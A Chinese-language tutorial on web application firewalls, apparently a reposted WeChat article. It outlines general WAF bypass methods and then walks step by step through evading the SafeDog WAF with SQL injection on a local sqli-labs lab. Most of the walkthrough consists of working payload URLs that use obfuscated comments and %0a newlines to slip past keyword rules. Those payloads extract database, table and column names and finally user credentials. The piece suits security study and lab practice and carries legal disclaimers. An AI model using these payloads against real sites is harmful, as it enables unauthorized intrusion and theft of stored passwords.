<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Dhtc-8I2lBp95cqSwr0YQw)

### 一、WAF 概述

WAF（Web 应用防火墙）作为一种专为 Web 应用程序设计的安全防护工具，其核心功能在于通过实施一系列针对 HTTP/HTTPS 协议的安全策略，来增强 Web 应用的安全性。WAF 内置了精心设计的检测逻辑与规则集，这些规则旨在对每一个进入系统的请求内容进行细致审查，并对任何违反安全策略的请求采取即时且有效的防御措施，从而维护 Web 应用环境的纯净与安全。

### 二、WAF 工作机制详解

WAF 的工作流程精心构建，涵盖四个关键环节：预处理、规则匹配、响应处理以及日志记录，共同编织成一张紧密的安全防护网。

1.  **「预处理阶段」**：此阶段，WAF 首先担任起 “守门人” 的角色，对所有进入的数据请求流量进行初步筛选，确认其是否遵循 HTTP/HTTPS 协议标准。紧接着，WAF 会利用预设的白名单机制，快速识别并放行那些已知安全或信任的 URL 请求，直接引导它们进入后端 Web 服务器进行处理。对于未能通过白名单验证的请求，WAF 则进一步深入，对其数据包进行精细解析，为后续的安全检测做准备。
    
2.  **「规则匹配阶段」**：此为核心环节，WAF 利用其内置的强大规则引擎，对经过解析的数据包进行深度扫描与匹配。这些规则覆盖了广泛的攻击场景与模式，包括但不限于 SQL 注入、跨站脚本（XSS）、命令注入等常见 Web 安全威胁。通过这一过程，WAF 能够精准识别出潜在的恶意请求，为后续的安全响应奠定坚实基础。
    
3.  **「响应处理阶段」**：基于规则匹配的结果，WAF 的响应处理模块将采取针对性的防御措施。对于符合安全规则的请求，WAF 会毫无阻碍地将其转发至后端 Web 服务器，确保用户请求得到及时响应。而对于那些被判定为恶意或异常的请求，WAF 则展现出其防御实力，通过阻断请求、记录日志或触发告警等多种方式，有效遏制潜在的安全风险，保护 Web 应用免受侵害。
    

### 三、常见的 waf 绕过姿势

常见的 WAF（Web 应用防火墙）绕过姿势包括但不限于以下几种：

1.  **「提交方式变换」**：许多 WAF 默认配置下主要对 GET 请求进行过滤，而忽略 POST 请求、Cookie、HTTP 头等其他提交方式。因此，可以尝试将攻击载荷通过不同的提交方式进行发送，以绕过 WAF 的检测。
    
2.  **「大小写替换和编码绕过」**：利用 WAF 规则可能不区分大小写或无法完全解析编码后的攻击载荷，通过将攻击语句中的关键字进行大小写替换或使用 URL 编码、Base64 编码等方式进行编码，以绕过 WAF 的过滤规则。
    
3.  **「事件函数变换」**：WAF 会重点识别触发 JavaScript 代码执行的事件函数字段，如 onclick。通过变换事件函数名称或利用其他不常见的事件函数，可以尝试绕过 WAF 的识别。
    
4.  **「注释符和内联注释」**：使用 SQL 注释符（如`--`、`#`）或 HTML/JavaScript 注释（如`<!-- -->`、`//`）来绕过 WAF 对特定关键字的过滤。有时，将攻击载荷与注释符结合使用，可以欺骗 WAF 使其忽略部分攻击载荷。
    
5.  **「分片传输」**：通过调整 HTTP 请求中的`Content-Length`头部，将攻击载荷分成多个部分发送，可能导致 WAF 无法完整解析请求内容，从而绕过检测。
    
6.  **「利用 WAF 软肋」**：WAF 在部署时可能因性能考虑而留下一些软肋，如对某些特殊字符或组合的检测不够严格。通过分析和测试 WAF 的行为，可能发现并利用这些软肋进行绕过。
    
7.  **「爬虫白名单绕过」**：部分 WAF 提供爬虫白名单功能，通过伪装成爬虫（修改 User-Agent 或模拟爬虫行为）可能绕过 WAF 的检测。
    
8.  **「高并发流量攻击」**：通过发送大量垃圾数据或高并发请求，使 WAF 设备进入 Bypass IPS 模式或达到性能极限，从而暂时或永久性地绕过 WAF 的防护。
    

请注意，上述绕过姿势仅供安全研究和教育目的使用。未经授权的渗透测试和网络攻击是非法行为，可能会对个人和组织造成严重的法律后果。在进行任何渗透测试之前，请确保已获得合法授权。

### 四、安全狗绕过姿势

环境：phpstudy—apache2.4.39

安全狗官网 v4.0 下载（应该是最新版）：https://www.safedog.cn/website_safedog.html

当然如果需要套件，我都给你准备好了关注后台回复【安全狗】即可获取，感谢宝子们一直以来的关注

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY08uxrXnibdia0HoJjicnO1QT8bddPibg7m2HQx0uw802tvX9aJJRbgsQiaQ/640?wx_fmt=png&from=appmsg)image-20240716123145404![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYNGT1vqedUREGRvrVib9FcztUUJib4suqDUoRPcOUv1ZEiamueOabMTrDQ/640?wx_fmt=png&from=appmsg)image-20240716123046249

在开始之前，如果没有 sql 注入基础的的童鞋，还请观看我的另外一篇文章，1w 字超详细解析。

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYuEF2nS6CqPudM3ankFBm7SNd4MBIMCBeazFwy0lIzfn3MwSVLVuxQw/640?wx_fmt=png&from=appmsg)

以下内容皆使用 sqli 第一关进行测试

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYauiaukxj79pDlicPljtPLlXj3icw3IvmcEjUUuoCvlO059ZXw8H2kCjww/640?wx_fmt=png&from=appmsg)image-20240716111521447

测试 id=1' and 1=1

```
http://192.168.209.131/Less-1/?id=-1' and 1=1


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYEwKtgBGCPYm8v6AQvSmS50iaWRP7NdG1RXcbYxaAUK7nGjbtJUPtFtw/640?wx_fmt=png&from=appmsg)image-20240715165511624

在之前的尝试中，我们发现直接使用 “and 1=1” 这种方法似乎并不奏效，这很可能是因为安全狗系统识别并过滤了 “and” 这个词。为了更深入地了解安全狗是如何识别并拦截这类操作的，我们可以尝试将 “and 1=1” 进行拆分

```
http://192.168.10.129:8080/sqli/Less-1/?id=1' and --+
http://192.168.10.129:8080/sqli/Less-1/?id=1' 1=1 --+


```

发现两个页面均返回 SQL 语法错误，这表明安全狗不会单独过滤‘and’或‘1=1’。我推测它可能是识别到‘and’后紧跟空格和字符的模式。为了验证这一点，我决定进行实验。

```
http://192.168.10.129:8080/sqli/Less-1/?id=1' and1--+
http://192.168.10.129:8080/sqli/Less-1/?id=1' and 1--+


```

实验结果，证实了确实是`and+空格+字符串`的格式会被拦截。

这里我们就可以开始尝试利用**「注释符」**、**「回车符 %0a」**等来代替空格进行绕过了！！

在此输入：

```
http://192.168.10.129:8080/sqli/Less-1/?id=1' and/**/1=1--+


```

发现依旧不行，打开 burp suite，拦截下我们阻截的包，添加`$`payload 到我们测试的**「注释符」**中然后点击发送到**「intruder」**模块，选择如下：

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYtuIRz4cCT86Iy7aic358Folyf9Odpz3B2Js4ibJGThyI5zGYGzIjk3VQ/640?wx_fmt=png&from=appmsg)image-20240715170533486

然后，点击 pyload，选择**「暴力破解」**（Brute forcer）：

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY678m5Yb1SLHufj8YdsazTdajjwezZ7M9MD9yebtcEjGDJHwvqsNv4w/640?wx_fmt=png&from=appmsg)image-20240715170457261

attack，开始攻击，安全狗有流量攻击的防御，后面可能会被拦截，解决办法直接**「重启」**apache 服务器。好了这里测试完成了，点击 length 更改默认排序，我们拿每个请求成功 payload（检查 response 即可查看是否成功，如果用户名正常显示，说明该字符 payload 安全狗没有进行拦截）。

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY2nYibub715bT3fQwdg2slj1skaQrxLknlhsleMGsMdbzqjF8FaIFEvg/640?wx_fmt=png&from=appmsg)image-20240715170405683

我们随便娶一个`/!*`得到 payload 和注释符拼接`/*/!**/`，这个时候 and 和后面的 1=1 之间用这个拼接的符号进行连接即可

```
http://192.168.209.131/Less-1/?id=1' and/*/!**/1=1 --+


```

可以绕过了

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYkibxueDpibHfiaowGW9FRbqxJp7cfBkZDnbajpkKGsBpXCcLqUiaEicnRkA/640?wx_fmt=png&from=appmsg)image-20240715170823637

order by 测试，我们用之前的测试结果，利用`/*/!**/`这一个充当空格，测试**「order by 3」**，然后看看能否成功？

```
http://192.168.209.131/Less-1/?id=1' order/*/!**/by 3 --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYkh0t66sJN3atKf8hEickwjVqtG9Hds7VDJyNpDaCeRRKQERKYTClMJg/640?wx_fmt=png&from=appmsg)image-20240715172306698

完美，接下来测试联合注入。普通测试 union select：

```
http://192.168.209.131/Less-1/?id=1' union select --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYyLDGdgbjXkbAVk4eFcpU8S4ITQHyaicH9GLabWtNBGV1b1egsX1Mjiag/640?wx_fmt=png&from=appmsg)image-20240715172414774

union 关键字测试，有回显

```
http://192.168.209.131/Less-1/?id=1' union --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYjxPnedNbKfEkaiaaNFMIvMOUa9Uxib73ZwZrase6YwRTokanZXMs2Y2A/640?wx_fmt=png&from=appmsg)image-20240715172507322

select 关键字测试，有回显

```
http://192.168.209.131/Less-1/?id=1' select --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYYSPaUZTfV9QRDzsesLD3Yich4U7ZXTn42A1AhgibRib1yNB5GZIQPlfibw/640?wx_fmt=png&from=appmsg)image-20240715172540647

已知安全狗 WAF 对联合注入的拦截规则是识别到`union select`字符串。为了探索是否能利用注释符绕过这一规则，我决定采用与之前相同的方法，利用 Burp 进行抓包，并加强**「fuzz 测试」**中的参数进行暴力破解尝试。

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYGmd8kgE4ItV3DkXw4vIVQMvYQsRahbJGfsS8gVMMhe3bYC4iaj6rn4A/640?wx_fmt=png&from=appmsg)image-20240715205818846

随便选择几个 1002 长度的响应结果

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYh6T2Po5icklzXVWXJkZbLCpZsXE2o79Edrgq1A7weXUa5s2mEqoCwCg/640?wx_fmt=png&from=appmsg)image-20240715205744548

这里我们选择 payload，取`/!*!/`，构造注释符 + payload，为`/*/!*!/*/`，插入 union 和 select 之间，绕过成功

```
http://192.168.5.64/Less-1/?id=1' union/*/!*!/*/select 1,2,3 --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYO63HZSLHj9eGQBEBumab6lMicRXBuZa4Vp3he95qibphiczQgGgzSxsqw/640?wx_fmt=png&from=appmsg)image-20240715210114937

这里还有一个思路，可以利用`--+%0a`这种格式通过换行继续执行，这里我们试一下看看：

> ❝
> 
> Tips：我的另一篇 sql 注入文章有写过 %0a 的作用，后台回复【sql 注入】【sql】等关键字即可查看
> 
> ❞

```
http://192.168.5.64/Less-1/?id=-1%27%20union/*!--+/*%0aselect%201,database(),3*/%20--+
相当于在普通sql语句中的
http://192.168.5.64/Less-1/?id=-1' union/*!--+/*
select 1,database(),3*/ --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY0Y8LZuS6NnTzkTm1GE3EgPrQtYToGYsqwYficfzuYr1iatGG7vx00ngg/640?wx_fmt=png&from=appmsg)image-20240715211304899

尝试报数据库

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database(),3 --+


```

发现 database() 被拦截了

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYRRafOWHiaAckFicRQOAkbpeWqNwVAia40gm93Ogt5ibggiaBrrgesbQBT3w/640?wx_fmt=png&from=appmsg)image-20240715211803058

我们把 database 的`()`给去掉

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database,3 --+


```

报错，此时就可以确定，安全狗应该是将 database() 进行检测

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYHMy0WjlfLfIxpsXW6HDbkQZQvIjfFmBLt2WX4jxNp3L66UjMBpBxkw/640?wx_fmt=png&from=appmsg)image-20240715212006918

然后我们继续使用注释符或者内联注释符看看吧：

继续采用 burp 的**「fuzz 测试」**：添加上变量

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYLKkvSOk39JCTqybZP9Y4LCH4gyujWSydLO8ySMcibzibFWZgIbh9gAGA/640?wx_fmt=png&from=appmsg)image-20240715213751892

扫出来 4 个 / 可以用，最简单的

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYNlQwA17WxTwOjA5Qpols0tiaSTLMZUXhKwia18kFnTzxgktJJxWPcAhA/640?wx_fmt=png&from=appmsg)image-20240715213840696

和之前一样，就不强调了，取注释符 + payload，构造 payload

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),3 --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYILibHdaMU5sTJiave3ry3PZHgpy1agmDSJpzYJvZtET7YE0ick1qZneqQ/640?wx_fmt=png&from=appmsg)image-20240715214011786

成功了！接下来一个一个关键词测试，group_concat()

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(table_name) --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY0peXahyg6WMThbev50ZFDd6SMDWWxeuibIx6uengiasyKSx0kZmP9OFQ/640?wx_fmt=png&from=appmsg)image-20240715214342969

没有拦截，继续 from

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(table_name) from --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYtkStNz8iaco3xsv7VWJkl6E6FnMYsL54jgPia9KrtoZlxLs4jRkkZs0Q/640?wx_fmt=png&from=appmsg)image-20240715214416033

informtion_schema.tables，结果就不行了

```
http://192.168.5.64/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(table_name) from informtion_schema.tables --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYrw9d48v8LoibhKkhPO8iasT8CT8micGdHH1GXSodgS5rQnzyxNKkw2Vug/640?wx_fmt=png&from=appmsg)image-20240715215224759

测试 %0a

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(table_name)%20from%20/*!--%20/*%0ainformation_schema.tables*/
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(table_name) from /*!-- /*
information_schema.tables*/


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYeEibuSLpaiaDkPauE8D6pHib1QVJ243QWwC75xZBjKs0jrjn91yebGFbw/640?wx_fmt=png&from=appmsg)image-20240716093748206

测试查当前数据库的表名，前面已经测试过 database() 了

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(table_name)%20from%20/*!--%20/*%0ainformation_schema.tables*/where%20table_schema=database/*////*/()%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(table_name) from /*!-- /*
information_schema.tables*/where table_schema=database/*////*/() --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYGyIzD6KicliamwjN2cicrxL721OC7icm009F6SXKf8XM8FibWhYQamPjjicA/640?wx_fmt=png&from=appmsg)image-20240716093930467

爆字段，测试到 and，table_name 都没拦截

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(column_name)%20from%20/*!--%20/*%0ainformation_schema.tables*/where%20table_schema=database/*////*/()%20and%20table_name%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(column_name) from /*!-- /*
information_schema.tables*/where table_schema=database/*////*/() and table_name --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYS00VwerJ7pV2PjsJWDEjNJt6AfyQK9zE9Koj0VS57CmkpZdapHiacsQ/640?wx_fmt=png&from=appmsg)image-20240716095210635

直到 table_name 后面加了个`=`

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(column_name)%20from%20/*!--%20/*%0ainformation_schema.tables*/where%20table_schema=database/*////*/()%20and%20table_name=%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(column_name) from /*!-- /*
information_schema.tables*/where table_schema=database/*////*/() and table_name= --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhY7FSl4LzCLlwPAyUEH8QCHOGZYW6rhMHzBncS3G8WbtYoSiaI0oF4SOg/640?wx_fmt=png&from=appmsg)image-20240716095144657

那么开始**「fuzz 测试」**爆破

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYqV0Y0XMbYsBKxzccTkFcvde3t2MqGiakhzjGz2Ty0OoFWylmSH8ajcQ/640?wx_fmt=png&from=appmsg)image-20240716103253642

随便娶一个 payload 和注释符进行拼接，如下

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(column_name)%20from%20/*!--%20/*%0ainformation_schema.columns*/where%20table_schema=database/*////*/()%20and%20table_name/*/***/=%22users%22%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(column_name) from /*!-- /*
information_schema.columns*/where table_schema=database/*////*/() and table_name/*/***/="users" --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYdEiaBDVBuqM4zHLxq1icdoklK12iaYkKn1byPjicVfVGMtsGsQrRsZ1lZA/640?wx_fmt=png&from=appmsg)image-20240716103446751

回车 %0a 的绕过方式

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(column_name)%20from%20/*!--%20/*%0ainformation_schema.columns*/where%20table_schema=database/*////*/()%20and%20/*!--%20/*%0atable_name*/=%22users%22%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(column_name) from /*!-- /*
information_schema.columns*/where table_schema=database/*////*/() and /*!-- /*
table_name*/="users" --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYicR9SuD9gPXf77v5vrXS0t2OnR25sjklOOQsFqic2YDPc7T782dUpgkg/640?wx_fmt=png&from=appmsg)image-20240716103752507

爆数据，已知表名为 users，字段为 id,username,password，并设置每个字段的分隔符为`-`，separator '-'

```
http://192.168.209.131/Less-1/?id=-1%27%20union/*/!*!/*/select%201,database/*////*/(),group_concat(id,username,password%20separator%20%27-%27)%20from%20/*!--%20/*%0ausers*/%20--+
相当于
http://192.168.209.131/Less-1/?id=-1' union/*/!*!/*/select 1,database/*////*/(),group_concat(id,username,password separator '-') from /*!-- /*
users*/ --+


```

![](https://mmbiz.qpic.cn/mmbiz_png/5975bXHXfWHA0jO9duwFbPN9HSjvLMhYN9VeZA9IZ1k1LoMTb0xeldK3lkXqTMMkHnqFMoEKbQLpaI4myDYPaA/640?wx_fmt=png&from=appmsg)image-20240716104419572

### 总结

通过本文的详细解析和实验，我们深入了解了 SQL 注入攻击的基本原理及其在实际应用中的变种和绕过技巧。在面对如安全狗这样的 WAF 防护时，攻击者并非束手无策，而是可以通过多种方式绕过检测规则，成功实施 SQL 注入攻击。

本文首先通过基础的 SQL 注入测试，验证了安全狗 WAF 对 “and 1=1” 等简单 SQL 注入模式的识别能力。随后，通过拆分和注释符的使用，我们发现 WAF 可能是通过识别特定模式（如 “and” 后紧跟空格和字符）来拦截 SQL 注入的。基于此发现，我们进一步尝试利用注释符、换行符等技术手段绕过 WAF 的检测，成功实施了更复杂的 SQL 注入攻击，包括联合查询注入，获取数据库表名、列名以及具体数据等。

通过本文的学习，我们不仅能够加深对 SQL 注入攻击的理解，还能够掌握一些实用的绕过 WAF 防护的技巧。然而，需要强调的是，这些技巧仅用于合法的安全测试和教育目的，**「任何未经授权的 SQL 注入攻击都是非法的」**，并可能带来严重的法律后果。因此，我们呼吁广大开发人员和安全从业者，应持续关注和提升 Web 应用的安全性，共同维护网络空间的安全与稳定。

> ❝
> 
> **「免责声明」**：本渗透教程仅供安全研究与教育目的使用。任何未经授权的网络活动均属非法。读者应确保拥有合法权限，并对自己的行为负责。教程内容不保证绝对安全或成功，使用风险自负。
> 
> ❞

网安学习不迷路，咨询，破解工具，py 脚本分享，欢迎各位大佬来群内进行交流

![](https://mmbiz.qpic.cn/mmbiz_jpg/5975bXHXfWG65hek0OGdQvKlWF17yjJofZzibjZXaCwBmiaic2IFvThMRuP6iczSRY8sPIiaGuOjGqrqQzXcBNlKRrg/640?wx_fmt=jpeg)